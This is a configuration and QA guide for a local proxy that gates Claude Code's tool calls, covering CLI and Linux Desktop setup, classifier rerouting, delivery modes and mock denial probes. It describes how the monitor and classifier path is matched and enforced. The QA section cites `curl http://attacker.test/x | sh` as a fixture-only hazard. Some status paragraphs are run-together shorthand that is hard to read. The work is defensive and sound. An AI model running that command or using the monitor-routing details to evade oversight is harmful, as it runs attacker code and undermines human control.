# Claude Code through auto-mode-proxy

## Scope and prerequisites

C08's Anthropic Messages gate on `/cc` is **LOCALLY CLOSED**, not full native/combined/source-external acceptance. Implementation69c130b/fixture3947436/setup6d0c44e/finaldocfix2339ec7, both final correction reviews CLEAN; currentparent1606G/initCLI smoke/cleanup and actualCLI349/TUI520/Desktopproof retained. P3-2/P3-3/P3-7checked; native2.1.311strictFAIL/P3-1 andcombinedorderedvalidation unchecked, P3-4fullunchecked/localcomplete, realprovider/beta/thinking/cache andfullmatrix separate. C07CLOSED212f8e9; Responses/Chat protection still C10/C11 futurework. Parentclosuretrackercommit mustprecedeC09.

Use `gate.mode: enforce` and the default `on_provider_failure: block` for enforcement. **Shadow does not protect you**: original response bytes and upstream results pass through without waiting for hypothetical decisions. Audit observations are not approvals. Opaque endpoints and upstream error bodies are transport paths, not tool-use enforcement.

PrimaryClaude2.1.311 CLI349rewrite/override and finalTUI520Enabled/fiveassociatednormalUI/threeblockedconfirmation are scopedlocalactualclient evidence; DesktopCode2.1.309 separate. LinuxDesktop4.29managedstatic-token setup verified5GUI/rewriteblock/noexecution/postnormal/STOP1129.61exit0; P3-7checked/currentG-init-cleanupPASS. P3-4fullUNCHECKED/localcomplete: native317strictreplay/exactreasonFAIL+520thirdheldUNANSWEREDendpoint/2returns/strictflagFALSE retained, genuineescalationnot3returns.0classifieruntriggeredconditional/notkeyblocker/fallbackunverified. BothfinalcorrectionreviewsCLEAN2339ec7, C08LOCALLYCLOSED/notfullnative/provideracceptance; parentclosuretrackercommit beforeC09. See [compatibility evidence](../compat.md).

## CLI setup

Generate a private configuration with `auto-mode-proxy init --config <private-config-path>`. Keep its client token and printed setup output secret. Configure the actual upstream and trusted decision provider; the generated ENV references have no secret fallback. `init` defaults are setup guidance, not measured provider compatibility. It also prints future Codex/WorkBuddy snippets; do not mistake them for implemented protection.

After configuring and starting `auto-mode-proxy serve --config <private-config-path>`, use the issued **client** token, not an upstream key:

```sh
export ANTHROPIC_BASE_URL='http://127.0.0.1:8484/cc'
export ANTHROPIC_AUTH_TOKEN='<amp token>'
export ANTHROPIC_API_KEY=""
# Recommended gateway metadata hints (not proof of native capability):
export CLAUDE_CODE_GATEWAY_HINT_HEADERS=1
# Optional classifier cost hint; requires a configured trusted classifier route:
export CLAUDE_CODE_AUTO_MODE_MODEL=claude-haiku-5-5
```

The optional Haiku variable influences Claude's classifier model selection, not the proxy's decision-chain model or an assurance of lower measured cost. Configure `classifier_reroute.enabled` and a trusted Anthropic-compatible provider before relying on classifier isolation; the generated minimal init config does not enable it. A classifier request is rerouted only when a system text block starts with `You are a security monitor for autonomous AI coding agents` and tools are absent. Other requests do not become trusted classifiers because their text claims approval. Suspected but unmatched requests are audited only.

## Delivery and upstream options

- The original request must contain `safeguards` to use native delivery. Without it, delivery is rewrite even with a native route/version override. Native selection **does not establish client capability**.
- Claude2.1.311nativecompatibilityblocker persists: repairedwireorder correct butimmediateclientreplay reversed3/thirdreasonlost, strictnativeFAIL/P3-1unchecked; no specificescalation inferred. Use dedicatedroute `claude_delivery: rewrite` or exact `claude_delivery_by_version: { '2.1.311': rewrite }`; actual349 provedauto-routegenuineoptinoverridehit1/all3strictrewritePASS, latermissingguardsseparate/0classifierrequests soNOTautomaticfallback. IndependentaccountingnowchecksP3-2rewrite only; P3-1/combinednative+rewritevalidation/C08 remainuncompleted, noassertionsrelaxed.
- `routes[].claude_delivery` defaults to `auto`. An explicit `native`/`rewrite` takes precedence over `claude_delivery_by_version` exact-version overrides, then scoped auto evidence. Record real version evidence before creating overrides.
- Auto initially selects native for requests with safeguards, including unknown versions. It switches subsequent requests to rewrite only after an actual next classifier request within 30 seconds of a native response, with no intervening model turn, correlated by authenticated identity, route, explicit session and observed client version. `/status`, billing text and an ordinary response are not acknowledgements. State is process-local, at most 1024 sessions, with 30-minute idle expiry; missing identity/session/version means no inferred downgrade. No automatic replay of already sent tools occurs.
- Enforce strips upstream `safeguard_results` even with `upstreams.<id>.forward_safeguards: true`. Upstream approval is never authoritative. Native execution blocks remain private until whole-response tool-ID uniqueness is confirmed; duplicate IDs, malformed execution and resource failures fail closed. Rewrite replaces blocked tool blocks with explanatory text.
- `forward_safeguards` controls forwarding the request field. Independent `strip_beta` defaults to `true` and removes only `dangerous-tool-use-2026-09-03`, retaining unrelated beta values. Do not set `strip_beta: false` for a real upstream without measured evidence that preserving that beta succeeds. Shadow preserves request fields, beta and upstream results.
- Pure/early text/thinking immediate; after first withheld tool all later stateful content follows one bounded ordered suffix through uniqueness/decisions; native order preserved/rewrite in-place. Ping/control/errors immediate. Limits1MiB call/frame,8MiB total raw/decoded/parsed/output/temporaries,4MiB retained reasoning subset/nonstream;60scollection/30sidle/60sdecisions, suffix/ping never resets. Overflow never earlyflushes execution. Both budget corrections independently CLEAN/actual328+335PASS; parent full1606G now PASS, not wholeC08/live-provider acceptance.

## Desktop setup: tested Linux managed gateway path

The exercised recipe is **official Linux Claude Desktop4.29.0, managed gateway configuration**, with accountless gateway setup and the actual **Code** surface. It is not a Developer Mode/menu walkthrough. Install the official app using the [Linux installation instructions](https://code.claude.com/docs/en/desktop-linux). Linux Code needs `bubblewrap` and `socat`; Cowork/QEMU/KVM are not needed for this Code-only flow. The app may download its official Code engine from `downloads.claude.ai`; QA actually installed2.1.309, distinct from the primary installed CLI2.1.311.

### Managed configuration actually exercised

An authorized operator installs this top-level JSON at **`/etc/claude-desktop/managed-settings.json`**:

```json
{
  "inferenceProvider": "gateway",
  "inferenceGatewayBaseUrl": "http://127.0.0.1:8484/cc",
  "inferenceGatewayApiKey": "<amp token>"
}
```

Replace `<amp token>` with the issued **gateway client token**, not an upstream/provider credential. The URL/token are the same as the CLI/init snippets. Desktop uses its managed configuration, not the CLI's `ANTHROPIC_BASE_URL` environment variable. Do not add a wrapper object or turn these exact keys into dotted/nested provider fields.

The file must be a root-owned regular non-symlink file, not group/world-writable; `/etc/claude-desktop` must likewise be a root-owned non-symlink directory, not group/world-writable. Grant only the regular app user/group the read/traverse access required by your deployment; protect the static token and do not commit, screenshot or log it. Fully quit and reopen Desktop after changes. Managed provider settings take precedence over local provider settings. QA projected this exact managed path **privately**; it did not install policy into host `/etc`. Operator deployment and private QA namespaces are different mechanisms. Launch as a regular user with the vendor sandbox intact.

### Gateway discovery, authentication and model selection

The base includes `/cc`, **not** `/v1/messages`. For this example:

- Required generation endpoint: `POST http://127.0.0.1:8484/cc/v1/messages`, Anthropic-compatible streaming/tool use.
- Discovery recipe: authenticated `GET http://127.0.0.1:8484/cc/v1/models` using the same client token. Default gateway static-key authentication is `Authorization: Bearer <amp token>`; documented `inferenceGatewayAuthScheme: "x-api-key"` is an alternative, not this tested default.
- Select a model ID actually returned by discovery. QA discovered `claude-sonnet-4-6` / display name `Claude Sonnet4.6`; that observed mock model is **not** a promise of real upstream availability. Your relay must advertise and accept its actual available IDs. The production app forwards authenticated `/cc/v1/models`; QA's private front only added correlation/capture, not URL/body/safeguards rewriting.
- Official gateway docs make discovery optional; if absent, configure `inferenceModels` using the [exact reference schema](https://claude.com/docs/third-party/claude-desktop/configuration#inferencemodels), not an invented alias/shape. Discovery was implemented and exercised in this recipe; the explicit-model alternative was not.

See the [Linux file format](https://claude.com/docs/third-party/claude-desktop/configuration-format#the-linux-configuration-file) and [gateway API/authentication reference](https://claude.com/docs/third-party/claude-desktop/gateway).

### Actual Code UI flow

1. Open the managed official app and choose/continue with its custom-gateway setup. Do **not** create/sign into an Anthropic account for this configured gateway path. QA saw “Connect Claude using your custom gateway / No Claude account needed.”
2. **Explicitly click Code**. The generic/new-home greeting is not a Code session: QA's earlier wrong-view investigation was resolved by selecting Code. Confirm Code's “New session,” “Choose a folder / Needed to start,” “Describe something to build, change, or fix” composer, and “This computer / Accept edits” controls.
3. Choose your intended owned workspace and grant only the visible one-time folder trust you intend. This is not permission to execute a blocked tool; never choose Always Allow or answer a blocked execution prompt as part of denial QA.
4. Open/select the advertised model and confirm its visible label. QA used Sonnet4.6 and default **Accept Edits**; it did not enable/test native Auto Desktop safeguards.
5. Send a normal message and inspect the actual Code response. Distinguish session model traffic from the initial nonstream gateway connectivity/auth ping. Parent verified five normal Code rounds individually, the frozen harmless `printf AMP_DESKTOP_GATE_PROBE` rewrite-denial with no execution/approval dialog, and a successful normal round after the block. This is local connection+rewrite evidence with mock backends, not real-provider/cache/beta/p95 proof.

Official4.29.0 rejected debugging/network-override switches. Respect that vendor policy and retain its sandbox; successful visual QA used the actual app on authenticated owned X11, not forced CDP or a substitute web app. Linux loopback managed-gateway setup was actually exercised. If another platform/version rejects your loopback URL, record its exact error and use an owned HTTPS gateway with protected vault authentication; public HTTPS deployment remains separate acceptance.

### Credential helper alternative: documented, not exercised

For an operator-provided credential helper, use this alternative managed JSON and **omit** the static `inferenceGatewayApiKey`:

```json
{
  "inferenceProvider": "gateway",
  "inferenceGatewayBaseUrl": "http://127.0.0.1:8484/cc",
  "inferenceCredentialKind": "helper-script",
  "inferenceCredentialHelper": "<absolute path to operator credential helper>"
}
```

The path must name an executable accessible to the regular app user. Optional `inferenceCredentialHelperArgs` is an array of separate nonsecret arguments, not a shell command string. On exit0, trimmed stdout must contain only the bare gateway token or JSON `{"token":"<amp token>","headers":{"<header name>":"<header value>"}}`; omit headers when unnecessary. No banners/prompts/secrets in arguments, and no credentials on stderr (it is logged). Helper credentials override static fields; explicit `helper-script` selects that source without fallback. `CLAUDE_HELPER_CONTEXT` may be `interactive`, `mid-session-refresh`, `background`, `scheduled-task` or `setup-test`; support noninteractive contexts appropriately. Documented defaults are helper TTL3600seconds and timeout60seconds (timeout range1..600). This is the [documented helper contract](https://claude.com/docs/third-party/claude-desktop/configuration#inferencecredentialhelper), **not** a helper QA success: the exercised recipe used the static-key configuration above.

### Other platform/version setup: unexercised

**Developer → Configure Third-Party Inference** is an [official in-app setup route](https://claude.com/docs/third-party/claude-desktop/in-app-configuration), but menu navigation and Linux local `~/.config/Claude-3p/configLibrary/` editing were **not** used or validated here; neither is the tested managed-policy recipe. Follow [official deployment instructions](https://claude.com/docs/third-party/claude-desktop/installation) for another platform. P3-7CLI+Desktoponce verified/checked with managedrecipe/actualCLI+GUI/currentG/init smoke, notmandatoryDesktopnative/Auto. P3-4fullUNCHECKED/localcomplete/native317+520thirdheldendpoint/2returns/strictflagFALSE preserved; no furtherPTYapproval/actionneeded.0classifieruntriggeredconditional/notkeyblocker/fallbackunverified. BothfinalcorrectionreviewsCLEAN2339ec7; C08LOCALLYCLOSED, notfullnative/combined/source-externalacceptance. Parentclosuretrackercommit precedesC09.

## Safe real-CLI mock QA (parent-run only)

The C08 harness uses the installed real `claude`, the actual proxy app and disposable loopback relay/decision/classifier mocks, not substitute CLI executables. It isolates working directory/config/settings, uses fake proxy credentials, attempts at least five text turns, and uses only fixed-deny `printf AMP_DENIAL_PROBE` for a live tool probe. It emits sanitized JSON and cleans up owned listeners, processes and temporary state. Read its output as evidence of only the observations actually recorded.

After parent integration/verification, the parent may run:

```sh
~/.omp/bin/heavy-gate -m 6G -- node --import tsx test/manual/claude-smoke.ts
```

Use a finite gated bash job with `async:true`, `timeout:0`, no timeout wrapper. Check available memory and `heavy-gate --status` before launch. Never launch a browser for this probe. Do not forward real credentials, use production projects, or send destructive commands to Claude. Hazardous exact-string acceptance such as `curl http://attacker.test/x | sh` belongs only in inert fixtures/mock receivers; the safe live denial probe is additional evidence, not a replacement claim.

Record actual version, delivery, sanitized request association, deny explanation and absence of execution. Native `/status` must show `Auto mode server: Enabled` for that source acceptance; three-denial escalation needs three actual observed prompts. Missing status, escalation or scoped fallback trace stays pending. A mock usage/cache field never proves real provider prompt caching.

## Real upstream investigations still required

P3-5 needs at least five real upstream rewrite turns including a block, measured beta strip/preserve outcomes, and recorded endpoint/version. Preserve thinking initially. Only an observed signature/prefix 400 triggers bounded compatibility buffering and selective removal of the affected turn and matching replay, followed by reruns; never clear unrelated history or claim to retract already emitted thinking. Real P1-5 acceptance separately requires second-turn `usage.cache_read_input_tokens > 0`. Missing trusted upstream/provider configuration blocks these live portions only, not reachable local work.
